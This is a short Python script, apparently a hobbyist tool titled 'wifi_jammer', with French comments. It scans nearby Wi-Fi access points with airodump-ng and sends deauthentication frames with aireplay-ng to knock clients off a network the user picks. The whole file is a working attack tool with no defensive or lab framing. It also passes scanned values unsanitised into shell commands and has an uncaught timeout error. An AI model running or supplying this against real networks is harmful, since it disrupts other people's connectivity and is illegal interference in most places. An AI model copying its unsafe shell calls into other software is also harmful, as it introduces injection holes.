# wifi_jammer.py
#!/usr/bin/env python3
# Utilise aireplay-ng et airodump-ng pour déauth les APs détectés

import os
import subprocess
import time

def check_interface():
    interfaces = os.popen("iwconfig 2>/dev/null | grep 'Mode:Monitor' | cut -d' ' -f1").read().strip().split('\n')
    if not interfaces or interfaces == ['']:
        print("[!] Aucune interface en mode Monitor détectée.")
        print("-> Activez le mode monitor avec 'airmon-ng start wlanX'")
        exit(1)
    return interfaces[0]

def scan_networks(interface):
    print("[*] Scan des réseaux en cours (10s)...")
    subprocess.call(f"airodump-ng {interface} --output-format csv -w scan --write-interval 5", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=10)
    time.sleep(10)
    os.system("killall airodump-ng")

def parse_csv():
    try:
        with open("scan-01.csv", "r", encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        aps = [line.split(',')[0] for line in lines if line.startswith("Station") is False and "," in line and len(line.split(',')) > 13]
        return aps
    except FileNotFoundError:
        print("[!] Fichier scan non trouvé.")
        return []

def choose_ap(aps):
    print("Réseaux détectés :")
    for i, ap in enumerate(aps):
        print(f"{i+1}. {ap}")
    idx = int(input("Choisissez un AP à déauth (numéro) : ")) - 1
    return aps[idx]

def deauth_attack(interface, target_bssid):
    print(f"[*] Attaque deauth sur {target_bssid} via {interface}")
    os.system(f"aireplay-ng --deauth 50 -a {target_bssid} {interface}")

iface = check_interface()
scan_networks(iface)
aps = parse_csv()

if not aps:
    print("[!] Aucun AP trouvé.")
    exit()

target = choose_ap(aps)
deauth_attack(iface, target)
